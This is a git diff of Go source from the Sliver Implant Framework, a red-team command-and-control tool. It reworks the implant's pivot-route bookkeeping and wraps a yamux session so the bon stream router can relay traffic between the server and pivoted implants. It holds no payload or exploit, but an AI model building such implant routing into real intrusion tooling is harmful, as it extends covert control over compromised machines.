@@ -1,12 +1,5 @@
 package route
 
-import (
-	"sync"
-
-	"github.com/hashicorp/yamux"
-	"github.com/ilgooz/bon"
-)
-
 /*
 	Sliver Implant Framework
 	Copyright (C) 2019  Bishop Fox
@@ -24,6 +17,17 @@ import (
 	You should have received a copy of the GNU General Public License
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
+
+import (
+	"log"
+	"net"
+	"sync"
+
+	"github.com/ilgooz/bon"
+
+	"github.com/bishopfox/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/3rdparty/hashicorp/yamux"
+)
 
 // The route package is used to route all traffic going either:
 // - From the server to a pivoted implant (through this pivot)
@@ -45,69 +49,82 @@ import (
 var (
 	// Routes - All active network routes.
 	Routes = &routes{
-		Active: []Chain{},
+		Active: map[uint32]sliverpb.Route{},
 		mutex:  &sync.Mutex{},
 	}
 )
 
 // routes - Holds all routes in which this implant is a node.
 type routes struct {
-	Active []Chain
+	Active map[uint32]sliverpb.Route
 	mutex  *sync.Mutex
-	Router *bon.Bon
-}
-
-// start - When the first route is registered, we register a mux router.
-// After this call, the implant is able to route traffic that is being forwarded
-// by the previous node in the chain (server -> pivot -> this implant).
-func start(transporter *yamux.Session) (err error) {
-	tpLog.Infof("Starting mux stream router")
-	Routes.Router = bon.New(transporter)
-	return
+	Server *bon.Bon
 }
 
 // Add - The implant has received a route request from the server.
-// The route is always ready to be used, as the server only sent us
-// what we need to route traffic, and only this.
-func (r *routes) Add(new *Chain) (*Chain, error) {
-
-	// If no routes yet, we need to register the mux router
-	// to the active transport's multiplexer session.
-	if len(r.Active) == 0 {
-		start(transports.ServerComms.Multiplexer)
-	}
-
-	// Add chain split to Active
-
-	// Add handle func to Router.
-
-	return &Chain{}, nil
+// TODO: If we have only len(Chain.Nodes) == 1, this means the last node
+// is a subnet, not a further node in the chain. Therefore we register
+// the special handler for net.Dial.
+func (r *routes) Add(new sliverpb.Route) (sliverpb.Route, error) {
+	r.mutex.Lock()
+	r.Active[new.ID] = new
+	r.mutex.Unlock()
+	return new, nil
 }
 
 // Remove - The implant has been ordered to stop routing traffic to a certain route.
 // We do not accept further streams for this one, and deregister it.
-func (r *routes) Remove(routeID uint64) (err error) {
+func (r *routes) Remove(routeID uint32) (err error) {
+	r.mutex.Lock()
+	delete(r.Active, routeID)
+	r.mutex.Unlock()
 	return
 }
 
-// The routing system is currently handling a stream. It checks the destination address,
-// and finds the correct node to forward the conn to. If the chain is empty, we pass the
-// conn to be handled directory by net.DialTCP/ net.DialUDP / other.
-func (r *routes) GetRouteFor(addr string) (route *Chain) {
+// router - Responsible for routing all streams muxed out of of a physical connection.
+// This router is being passed various objects drawned from transports, etc.
+// This object also wraps the multiplexer so as to be compatible with the Bon router object.
+type router struct {
+	session *yamux.Session
+}
+
+// SetupMuxRouter - When the first route is registered, we register a mux router.
+// After this call, the implant is able to route traffic that is being forwarded
+// by the previous node in the chain (server -> pivot -> this implant).
+func SetupMuxRouter(mux *yamux.Session) (router *bon.Bon) {
+	// {{if .Config.Debug}}
+	log.Printf("Starting mux stream router")
+	// {{end}}
+	r := newRouter(mux)
+	router = bon.New(r)
+
+	// Set default (non-matching) handlers.
+
 	return
 }
 
-// Chain - A chain holds all nodes of a proxy chain, and builds routes from it.
-type Chain struct {
-	ID      bon.Route // Used by bon stream router over yamux.
-	Retries int
-	route   []Node
+func newRouter(mux *yamux.Session) *router {
+	return &router{session: mux}
 }
 
-// Node - A proxy node, mainly used to construct a proxy chain.
-// Each node in a chain is an implant process.
-type Node struct {
-	ID   int
-	Addr string
-	Host string
+// Accept - The router is able to accept a new muxed stream.
+func (s *router) Accept() (net.Conn, error) {
+	// {{if .Config.Debug}}
+	log.Printf("[route] accepting new stream")
+	// {{end}}
+	return s.session.Accept()
+}
+
+// Open - The router is able to open a new stream so as to
+// forward the connection that we want to route, with a Route r.
+func (s *router) Open(r bon.Route) (net.Conn, error) {
+	// {{if .Config.Debug}}
+	log.Printf("[route] routing newly accepted stream")
+	// {{end}}
+	return s.session.Open()
+}
+
+// Close - The router can close the multiplexer session.
+func (s *router) Close() error {
+	return s.session.Close()
 }
